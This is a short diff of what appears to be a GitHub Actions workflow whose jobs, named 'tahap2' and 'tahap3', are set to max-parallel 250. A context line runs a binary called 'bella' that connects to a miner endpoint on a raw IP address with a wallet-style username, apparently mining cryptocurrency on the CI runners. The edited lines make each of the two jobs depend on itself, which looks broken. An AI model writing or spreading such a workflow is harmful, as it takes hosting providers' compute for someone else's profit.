@@ -32,7 +32,7 @@ jobs:
       run: cd gh2 && ./target/release/bella --url ws://20.3.244.126:8080/mine mine --username HGeykyUPKrVZ8uLgg4WAYLusSQRif1AXFUepxJ3gEYx8.mincuk1 --cores 4 &
         sleep 310s
   tahap2:
-    needs: gas2
+    needs: tahap2
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 250
@@ -61,7 +61,7 @@ jobs:
     
      
   tahap3:
-    needs: [gas3]
+    needs: [tahap3]
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 250
